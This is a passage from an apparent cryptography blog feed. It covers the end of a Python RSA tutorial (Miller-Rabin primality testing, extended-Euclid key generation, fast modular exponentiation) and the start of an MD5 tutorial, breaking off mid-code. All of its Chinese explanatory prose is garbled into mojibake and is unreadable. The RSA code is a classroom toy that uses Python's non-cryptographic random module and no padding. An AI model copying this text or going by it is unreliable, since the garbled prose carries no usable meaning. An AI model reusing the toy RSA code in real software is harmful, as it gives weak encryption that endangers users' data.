¸å¿ƒä»£ç æ˜¯ä¸‹é¢çš„ä»£ç ï¼Œè¿™é‡Œæ˜¯æ ¹æ®æ¶ˆæ¯çš„é•¿åº¦å»äº§ç”Ÿpå’Œqï¼Œæ€ä¹ˆçŸ¥é“è¿™ä¸¤å¤§æ•°æ˜¯ä¸ªç´ æ•°å‘¢ï¼Ÿå°±å¾—é€šè¿‡Miller-Rabinæ¦‚ç‡ç´ æ•°æµ‹è¯•ç®—æ³•ï¼Œå…ˆåˆ¤æ–­ä¸€æ¬¡è´¹é©¬å°å®šç†ï¼Œæ»¡è¶³çš„è¯å°±æœ‰å¯èƒ½æ˜¯ä¸€ä¸ªç´ æ•°ï¼Œç„¶åå†ç»è¿‡5æ¬¡çš„Miller-Rabinç´ æ€§æµ‹è¯•ï¼Œè¿™æ ·å°±å¯ä»¥å¾ˆå¤§æ¦‚ç‡è¯´æ˜å…¶æ˜¯ç´ æ•°ï¼Œä¸¤æ¬¡è°ƒç”¨è¿™æ ·çš„è¿‡ç¨‹å°±å¯ä»¥äº§ç”Ÿpå’Œqã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#è¾—è½¬ç›¸é™¤æ³•æ±‚æœ€å¤§å…¬å› æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a &gt; b: a, b = b, a</span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isPrime</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    åˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯å¦ä¸ºç´ æ•°</span></span><br><span class="line"><span class="string">    å„æ‹‰æ‰˜å¡å¸ˆé™¤æ³• </span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, int(math.sqrt(n)) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> n % i== <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#å¼€å§‹é€‰æ‹©p q</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_prime</span><span class="params">(half_len)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        n = random.randint(<span class="number">0</span>, <span class="number">1</span> &lt;&lt; half_len)<span class="comment">#æ±‚2^half_lenä¹‹é—´çš„å¤§æ•°</span></span><br><span class="line">        <span class="keyword">if</span> n % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">            found = <span class="keyword">True</span></span><br><span class="line">            <span class="comment"># éšæœºæ€§æµ‹è¯•</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">5</span>):   <span class="comment">#5çš„æ—¶å€™é”™è¯¯ç‡å·²ç»å°äºåƒåˆ†ä¹‹ä¸€</span></span><br><span class="line">                <span class="keyword">if</span> prime_test(n) == <span class="keyword">False</span>:</span><br><span class="line">                    found = <span class="keyword">False</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> found == <span class="keyword">True</span>:</span><br><span class="line">                <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="comment">#Miller-Rabin</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prime_test</span><span class="params">(n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        æµ‹è¯•næ˜¯å¦ä¸ºç´ æ•°</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        q = n - <span class="number">1</span></span><br><span class="line">        k = <span class="number">0</span></span><br><span class="line">        <span class="comment"># å¯»æ‰¾k,q æ˜¯å¦æ»¡è¶³2^k*q =n - 1</span></span><br><span class="line">        <span class="keyword">while</span> q % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            k += <span class="number">1</span></span><br><span class="line">            q = q // <span class="number">2</span></span><br><span class="line">        a = random.randint(<span class="number">2</span>, n - <span class="number">2</span>)</span><br><span class="line">        <span class="comment"># å¦‚æœ a^q mod n= 1, n å¯èƒ½æ˜¯ä¸€ä¸ªç´ æ•°</span></span><br><span class="line">        <span class="keyword">if</span> fast_mod(a, q, n) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="comment"># å¦‚æœå­˜åœ¨jæ»¡è¶³ a ^ ((2 ^ j) * q) mod n == n-1, n å¯èƒ½æ˜¯ä¸€ä¸ªç´ æ•°</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, k):</span><br><span class="line">            <span class="keyword">if</span> fast_mod(a, (<span class="number">2</span> ** j) * q, n) == n - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="comment"># n ä¸æ˜¯ç´ æ•°</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure><p>å› ä¸ºæ˜¯å›ºå®šå¥½å…¬é’¥e=65537çš„ï¼Œæ‰€ä»¥ä¸‹ä¸€æ­¥çš„å…³é”®å°±æ˜¯è¦å®ç°é€šè¿‡æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•å»æ±‚å‡ºç§é’¥dï¼Œè¿™é‡Œé¢çš„å…³é”®ä»£ç å¦‚ä¸‹ï¼Œå…ˆæ˜¯æ±‚å‡ºphi(n)ç„¶åå°±é€šè¿‡æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚å‡ºç§é’¥dï¼Œç„¶æ‰©å±•æ¬§å‡ é‡Œçš„ç®—æ³•ä½¿ç”¨äº†é€’å½’çš„æ–¹æ³•å»å®ç°ï¼Œä½†æ˜¯äº§ç”Ÿçš„ç§é’¥dæœ‰å¯èƒ½æ˜¯ä¸€ä¸ªè´Ÿæ•°ï¼Œä½ å¾—å¯¹å…¶è¿›è¡Œå¤„ç†ï¼Œæœ€åäº§ç”Ÿä¸€ä¸ªå¤§äºé›¶çš„ç§é’¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_key</span><span class="params">(key_len)</span>:</span> <span class="comment">#key_lenè¦æ¯”æ¶ˆæ¯é•¿åº¦å¤§</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    ç”Ÿæˆn, e, d</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    p = random_prime(key_len // <span class="number">2</span>)</span><br><span class="line">    q = random_prime(key_len // <span class="number">2</span>)</span><br><span class="line">    n  = p * q</span><br><span class="line">    ph_n = (p <span class="number">-1</span>) * (q <span class="number">-1</span>)</span><br><span class="line">    print(<span class="string">"ph_n:"</span>+str(ph_n))</span><br><span class="line">    e = <span class="number">65537</span> <span class="comment">#eå–å›ºå®šå€¼</span></span><br><span class="line">    d = generate_d(ph_n, e)</span><br><span class="line">    <span class="keyword">return</span> (n ,e, d)</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">ext_gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y, q = ext_gcd(b, a % b)</span><br><span class="line">        x, y = y, (x - (a // b) * y)</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br><span class="line">        </span><br><span class="line">   <span class="comment">#äº§ç”Ÿç§˜é’¥d</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_d</span><span class="params">(ph_n, e)</span>:</span></span><br><span class="line">    (x, y, r) = ext_gcd(ph_n, e)</span><br><span class="line">    <span class="comment"># y maybe &lt; 0, so convert it</span></span><br><span class="line">    <span class="keyword">if</span> y &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment">#return y % ph_n</span></span><br><span class="line">        <span class="keyword">return</span> y + ph_n  <span class="comment">#ç›´æ¥ç”¨åŠ æ³•æ•ˆç‡é«˜ä¸€ä¸¢ä¸¢</span></span><br><span class="line">    <span class="keyword">return</span> y</span><br></pre></td></tr></table></figure><p>åœ¨æ‰§è¡Œè¿ç®—çš„æ—¶å€™ä½¿ç”¨äº†ä¸€ä¸ªå¿«é€Ÿå¹‚çš„æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å¯ä»¥å°†æ•°å€¼å¤§ä¸€ç‚¹çš„æ•°ç®€åŒ–å…¶æ¨¡å¹‚è¿ç®—çš„è¿‡ç¨‹ï¼Œä»£ç å¦‚ä¸‹ï¼Œå½“ç„¶è¿™æ ·çš„è¿‡ç¨‹ä¹Ÿå¯ä»¥ä½¿ç”¨pythoné‡Œé¢çš„powå‡½æ•°å»å®ç°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fast_mod</span><span class="params">(b, n, m)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    å¿«é€Ÿå¹‚</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    ret = <span class="number">1</span></span><br><span class="line">    tmp = b</span><br><span class="line">    <span class="keyword">while</span> n:</span><br><span class="line">        <span class="keyword">if</span> n &amp; <span class="number">0x1</span>:</span><br><span class="line">            ret = ret * tmp % m</span><br><span class="line">        tmp = tmp * tmp % m</span><br><span class="line">        n &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br></pre></td></tr></table></figure><h3 id="æ­£ç¡®æ€§"><a href="#æ­£ç¡®æ€§" class="headerlink" title="æ­£ç¡®æ€§"></a>æ­£ç¡®æ€§</h3><p>ä»¥â€helloworldaaaâ€ä¸ºä¾‹èƒ½å¤Ÿæ­£ç¡®åŠ è§£å¯†å¹¶ä¸”è¾“å‡ºåŠ è§£å¯†çš„å…¬é’¥ä»¥åŠç§é’¥ã€‚</p><p><a href="https://imgchr.com/i/F5RHAO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/02/F5RHAO.png" alt="F5RHAO.png"></a></p><h3 id="è¯¦ç»†ä»£ç -æ”¾åœ¨githubä¸Šäº†-ï¼šRSAåŠ è§£å¯†"><a href="#è¯¦ç»†ä»£ç -æ”¾åœ¨githubä¸Šäº†-ï¼šRSAåŠ è§£å¯†" class="headerlink" title="è¯¦ç»†ä»£ç (æ”¾åœ¨githubä¸Šäº†)ï¼šRSAåŠ è§£å¯†"></a>è¯¦ç»†ä»£ç (æ”¾åœ¨githubä¸Šäº†)ï¼š<a href="https://github.com/0v3rW4tch/Cryptography-course-design" target="_blank" rel="noopener">RSAåŠ è§£å¯†</a></h3>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;ç®€ä»‹&quot;&gt;&lt;/a&gt;ç®€ä»‹&lt;/h3&gt;&lt;p&gt;RSAæ˜¯ç¬¬ä¸€ä¸ªå®‰å…¨ï¼Œå®ç”¨çš„å…¬é’¥åŠ å¯†ç®—æ³•ï¼Œå·²æˆä¸ºå›½å®¶æ ‡å‡†ï¼Œæ˜¯ç›®å‰åº”ç”¨å¹¿æ³›çš„å…¬é’¥åŠ å¯†ä½“åˆ¶ï¼ŒRSAçš„åŸºç¡€æ˜¯æ•°è®ºçš„æ¬§æ‹‰å®šç†
    
    </summary>
    
      <category term="å¯†ç å­¦" scheme="0verwatch.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="å¯†ç å­¦" scheme="0verwatch.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>MD5åŸç†åŠPythonå®ç°</title>
    <link href="0verwatch.top/MD5-python.html"/>
    <id>0verwatch.top/MD5-python.html</id>
    <published>2019-01-12T08:32:37.000Z</published>
    <updated>2019-01-12T08:33:25.484Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>MD5æ¶ˆæ¯æ‘˜è¦ç®—æ³•ä¸€ç§è¢«å¹¿æ³›ä½¿ç”¨çš„å¯†ç æ•£åˆ—å‡½æ•°ï¼Œè¾“å…¥é•¿åº¦å°äº2^64æ¯”ç‰¹çš„æ¶ˆæ¯ï¼Œæˆ‘çš„ä»£ç ä¹Ÿæ˜¯ä»¥å°äº2^64æ¯”ç‰¹çš„æ¶ˆæ¯ä¸ºä¾‹ï¼Œè¾“å‡ºä¸€ä¸ª128ä½ï¼ˆ16å­—èŠ‚ï¼‰çš„æ•£åˆ—å€¼<a id="more"></a>ï¼ˆhash valueï¼‰ï¼Œè¾“å…¥ä¿¡æ¯ä»¥512æ¯”ç‰¹çš„åˆ†ç»„ä¸ºå•ä½å¤„ç†ã€‚</p><h3 id="ç®—æ³•æµç¨‹"><a href="#ç®—æ³•æµç¨‹" class="headerlink" title="ç®—æ³•æµç¨‹"></a>ç®—æ³•æµç¨‹</h3><ol><li>é™„åŠ ä½å¡«å……</li><li>åˆå§‹åŒ–é“¾æ¥å˜é‡</li><li>åˆ†ç»„å¤„ç†</li><li>æ­¥å‡½æ•°çš„è¿ç®—</li></ol><p>è¿™ä¸ªæµç¨‹æè¿°ä¸‹æ¥éå¸¸ç¬¦åˆhashå‡½æ•°çš„ä¸€èˆ¬æ¨¡å‹ï¼š</p><p><img src="https://s1.ax1x.com/2018/12/25/FgKNgH.png" alt="FgKNgH.png"></p><p>å•ä¸ªç‚¹æ‹¿å‡ºæ¥ä»”ç»†åˆ†æ</p><h4 id="é™„åŠ ä½å¡«å……"><a href="#é™„åŠ ä½å¡«å……" class="headerlink" title="é™„åŠ ä½å¡«å……"></a>é™„åŠ ä½å¡«å……</h4><p>å¡«å……ä¸€ä¸ª1å’Œè‹¥å¹²ä¸ª0ä½¿æ¶ˆæ¯é•¿åº¦æ¨¡512ä¸448åŒä½™ï¼Œä¹Ÿå°±è¯´å‰©ä½™æ¶ˆæ¯(æ­¤å¤„çš„æ¶ˆæ¯é•¿åº¦å·²ç»ä¸æ»¡512ä½äº†)çš„æœ€å512æ¯”ç‰¹åˆ†ç»„é‡Œé¢åŠ ä¸Šè¿™ä¸€å¯¹å¡«å……çš„ä¸œè¥¿é•¿åº¦åº”è¯¥æ˜¯448ï¼Œè¿˜å‰©ä¸‹64ä½æ˜¯æ¶ˆæ¯çš„é•¿åº¦ï¼Œæ»¡è¶³L mod 2^64,ä¸‹å›¾å°±å¾ˆæ¸…æ¥šè§£é‡Šäº†è¿™ä¸€è¿‡ç¨‹ï¼š</p><p><img src="https://s1.ax1x.com/2018/12/25/Fgu4hD.png" alt="Fgu4hD.png"></p><p>å…³é”®ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">length = struct.pack(<span class="string">'&lt;Q'</span>, len(message)*<span class="number">8</span>)  <span class="comment">#åŸæ¶ˆæ¯é•¿åº¦64ä½æ¯”ç‰¹çš„æ·»åŠ æ ¼å¼ï¼Œå¤ªéªšé¢è¿™ç§å†™æ³•</span></span><br><span class="line">   <span class="keyword">while</span> len(message) &gt; <span class="number">64</span>:</span><br><span class="line">       solve(message[:<span class="number">64</span>])</span><br><span class="line">       message = message[<span class="number">64</span>:]</span><br><span class="line">   <span class="comment">#é•¿åº¦ä¸è¶³64ä½æ¶ˆæ¯è‡ªè¡Œå¡«å……</span></span><br><span class="line">   message += <span class="string">'\x80'</span></span><br><span class="line">   message += <span class="string">'\x00'</span> * (<span class="number">56</span> - len(message) % <span class="number">64</span>)</span><br><span class="line">   <span class="comment">#print type(length)</span></span><br><span class="line">   message += length</span><br><span class="line">   solve(message[:<span class="number">64</span>])</span><br></pre></td></tr></table></figure><h4 id="åˆå§‹åŒ–é“¾æ¥å˜é‡"><a href="#åˆå§‹åŒ–é“¾æ¥å˜é‡" class="headerlink" title="åˆå§‹åŒ–é“¾æ¥å˜é‡"></a>åˆå§‹åŒ–é“¾æ¥å˜é‡</h4><p>ä½¿ç”¨4ä¸ª32ä½çš„å¯„å­˜å™¨Aï¼Œ Bï¼ŒCï¼Œ Då­˜æ”¾4ä¸ªå›ºå®šçš„32ä½æ•´å‹å‚æ•°ï¼Œç”¨äºç¬¬ä¸€è½®è¿­ä»£ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ï¼Œä¹¦æœ¬ä¸Šçš„å€¼æ˜¯ç›´æ¥ç»™ä½ çš„ï¼Œä½†æ˜¯æ²¡æœ‰å€’è¿‡æ¥ï¼Œä¹Ÿå°±æ˜¯å¤§ç«¯å’Œå°ç«¯çš„è½¬æ¢é—®é¢˜ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#åˆå§‹å‘é‡</span></span><br><span class="line">A, B, C, D = (<span class="number">0x67452301</span>, <span class="number">0xefcdab89</span>, <span class="number">0x98badcfe</span>, <span class="number">0x10325476</span>)</span><br><span class="line"><span class="comment"># A, B, C, D = (0x01234567, 0x89ABCDEF, 0xFEDCBA98, 0x76543210)</span></span><br></pre></td></tr></table></figure><h4 id="åˆ†ç»„å¤„ç†"><a href="#åˆ†ç»„å¤„ç†" class="headerlink" title="åˆ†ç»„å¤„ç†"></a>åˆ†ç»„å¤„ç†</h4><p>ä¸åˆ†ç»„å¯†ç åˆ†ç»„å¤„ç†ç›¸ä¼¼ï¼Œæœ‰4è½®æ­¥éª¤ï¼Œå°†512æ¯”ç‰¹çš„æ¶ˆæ¯åˆ†ç»„å¹³å‡åˆ†ä¸º16ä¸ªå­åˆ†ç»„ï¼Œæ¯ä¸ªå­åˆ†ç»„æœ‰32æ¯”ç‰¹ï¼Œå‚ä¸æ¯ä¸€è½®çš„çš„16æ­¥è¿ç®—ï¼Œæ¯æ­¥è¾“å…¥æ˜¯4ä¸ª32æ¯”ç‰¹çš„é“¾æ¥å˜é‡å’Œä¸€ä¸ª32ä½çš„çš„æ¶ˆæ¯å­åˆ†ç»„ï¼Œç»è¿‡è¿™æ ·çš„64æ­¥ä¹‹åå¾—åˆ°4ä¸ªå¯„å­˜å™¨çš„å€¼åˆ†åˆ«ä¸è¾“å…¥çš„é“¾æ¥å˜é‡è¿›è¡Œæ¨¡åŠ ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼Œä¸ºäº†èƒ½å¤Ÿä¿å­˜ä¸€ä¸‹ä¸€å¼€å§‹Aï¼ŒBï¼ŒCï¼ŒDè¿™å››ä¸ªåˆå§‹å˜é‡çš„å€¼ï¼Œæ‰€ä»¥å°±å…ˆæ‰¾å››ä¸ªå˜é‡æŠŠä»–ä»¬çš„å€¼æš‚å­˜ä¸€ä¸‹ï¼Œä¸ºæœ€åä¸€æ­¥çš„æ¨¡åŠ åšå‡†å¤‡ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(chunk)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> A</span><br><span class="line">    <span class="keyword">global</span> B</span><br><span class="line">    <span class="keyword">global</span> C</span><br><span class="line">    <span class="keyword">global</span> D</span><br><span class="line">    w = list(struct.unpack(<span class="string">'&lt;'</span> + <span class="string">'I'</span> * <span class="number">16</span>, chunk))  <span class="comment">#åˆ†æˆ16ä¸ªç»„ï¼ŒIä»£è¡¨1ç»„32ä½,tql,å­¦åˆ°äº†</span></span><br><span class="line">    a, b, c, d = A, B, C, D</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):  <span class="comment">#64è½®è¿ç®—</span></span><br><span class="line">        <span class="keyword">if</span> i &lt; <span class="number">16</span>:  <span class="comment">#æ¯ä¸€è½®è¿ç®—åªç”¨åˆ°äº†b,c,dä¸‰ä¸ª</span></span><br><span class="line">            f = ( b &amp; c)|((~b) &amp; d)</span><br><span class="line">            flag  = i      <span class="comment">#ç”¨äºæ ‡è¯†å¤„äºç¬¬å‡ ç»„ä¿¡æ¯</span></span><br><span class="line">        <span class="keyword">elif</span> i &lt; <span class="number">32</span>:</span><br><span class="line">            f = (b &amp; d)|(c &amp; (~d))</span><br><span class="line">            flag = (<span class="number">5</span> * i +<span class="number">1</span>) %<span class="number">16</span></span><br><span class="line">        <span class="keyword">elif</span> i &lt; <span class="number">48</span>:</span><br><span class="line">            f = (b ^ c ^ d)</span><br><span class="line">            flag  = (<span class="number">3</span> * i + <span class="number">5</span>)% <span class="number">16</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f = c ^(b |(~d))</span><br><span class="line">            flag  = (<span class="number">7</span> * i ) % <span class="number">16</span></span><br><span class="line">        tmp = b + lrot((a + f + k[i] + w[flag])&amp; <span class="number">0xffffffff</span>,r[i]) <span class="comment">#&amp;0xffffffffä¸ºäº†ç±»å‹è½¬æ¢</span></span><br><span class="line">        a, b, c, d = d, tmp &amp; <span class="number">0xffffffff</span>, b, c</span><br><span class="line">        <span class="comment">#print(hex(a).replace("0x","").replace("L",""), hex(b).replace("0x","").replace("L","") , hex(c).replace("0x","").replace("L",""), hex(d).replace("0x","").replace("L",""))</span></span><br><span class="line">    A = (A + a) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    B = (B + b) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    C = (C + c) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    D = (D + d) &amp; <span class="number">0xffffffff</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸Šé¢çš„ä»£ç ä¹ŸåŒ…å«äº†ç¬¬å››æ­¥çš„æ­¥å‡½æ•°ï¼Œå¯ä»¥å•ç‹¬æŠŠä»–ä»¬æå–å‡ºæ¥ï¼Œè€Œä¸åŒè½®ä½¿ç”¨çš„æ­¥å‡½æ•°ä½¿ç”¨çš„éçº¿æ€§å‡½æ•°æ˜¯ä¸ä¸€æ ·çš„ã€‚å³å››è½®ä½¿ç”¨å››ä¸ªä¸åŒçš„éçº¿æ€§å‡½æ•°ï¼Œå…¶å®å¯ä»¥å‘ç°æ¯ä¸ªéçº¿æ€§å‡½æ•°çš„è¾“å…¥ä¸éœ€è¦Aå¯„å­˜å™¨é‡Œé¢çš„å€¼ï¼Œæˆ‘ä»¬åªéœ€è¦Bï¼ŒCï¼ŒDå¯„å­˜å™¨é‡Œé¢çš„ä¸œè¥¿ï¼Œè¿™é‡Œé¢å¾—å‡ºæ¥çš„ç»“æœåˆ†åˆ«æ”¾è¿›Aï¼ŒCï¼ŒDå¯„å­˜å™¨ï¼Œæ‰€ä»¥ä¸€å¼€å§‹æ‰è¦æ‰¾å¦å¤–çš„å¯„å­˜å™¨å»å­˜å‚¨æœ¬èº«çš„å€¼ï¼Œä¸ç„¶çš„è¯åœ¨è½¬åŒ–è¿‡ç¨‹ä¸­æœ¬èº«çš„å˜é‡ä¼šä¸¢å¤±ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f = ( b &amp; c)|((~b) &amp; d)</span><br><span class="line">f = (b &amp; d)|(c &amp; (~d))</span><br><span class="line">f = (b ^ c ^ d)</span><br><span class="line">f = c ^(b |(~d))</span><br></pre></td></tr></table></figure><p>Aå¯„å­˜å™¨é‡Œé¢çš„å€¼çš„è¿ç®—æœ‰å¦å¤–è‡ªå·±çš„ä¸€å¥—æ¨¡å¼ï¼Œå…ˆç”¨Bï¼ŒCï¼ŒDå‘é‡é‡Œé¢åšä¸€æ¬¡éçº¿æ€§çš„è¿ç®—ï¼Œç„¶åå°†å¾—å‡ºæ¥çš„ç»“æœä¾æ¬¡åŠ ä¸Šç¬¬ä¸€ä¸ªå˜é‡ï¼Œ32æ¯”ç‰¹çš„æ¶ˆæ¯å’Œä¸€ä¸ªä¼ªéšæœºæ•°å¸¸æ•°ï¼Œå†å°†ç»“æœå¾ªç¯å·¦ç§»æŒ‡å®šçš„ä½æ•°ï¼Œå¹¶åŠ ä¸ŠBçš„å€¼ï¼Œæœ€åæŠŠå¾—å‡ºæ¥çš„ç»“æœæ”¾è¿›Bå¯„å­˜å™¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å¾ªç¯å·¦ç§»çš„ä½ç§»ä½æ•°</span></span><br><span class="line">r = [   <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,</span><br><span class="line">        <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>,</span><br><span class="line">         <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span 